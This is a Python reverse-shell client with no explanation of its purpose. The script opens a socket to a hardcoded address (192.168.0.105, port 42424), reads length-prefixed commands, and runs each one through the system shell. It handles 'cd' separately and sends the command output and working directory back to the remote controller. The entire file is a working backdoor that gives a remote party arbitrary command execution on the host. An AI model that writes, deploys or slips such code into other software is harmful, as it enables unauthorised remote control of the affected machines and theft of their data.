import socket
import subprocess
import os

# ------CONSTANTS-------
HEADERSIZE = 10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.105", 42424))


while True:
    full_msg = ''
    new_msg = True
    while True:
        msg = s.recv(16)
        if new_msg:
            msglength = msg[:HEADERSIZE].decode("utf-8")
            print("msg length {}".format(msglength.strip(" ")))
            try:
                msglen = int(msglength)
            except ValueError:
                continue
            new_msg = False

        full_msg += msg.decode("utf-8")

        if len(full_msg)-HEADERSIZE == msglen:
            full_msg = full_msg[HEADERSIZE:]
            if full_msg == "check alive test":
                s.send(bytes("he", "utf-8"))
                full_msg = ""
                new_msg = True
                continue
            if "cd" in full_msg:
                print("testt")
                os.chdir(full_msg[3:])
            if len(full_msg) > 0:
                cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                output_str = output_str + str(os.getcwd()) + '> '
                output_str = f"{len(output_str):<{HEADERSIZE}}"+ output_str
                s.send(str.encode(output_str, "utf-8"))
            full_msg = ""
            new_msg = True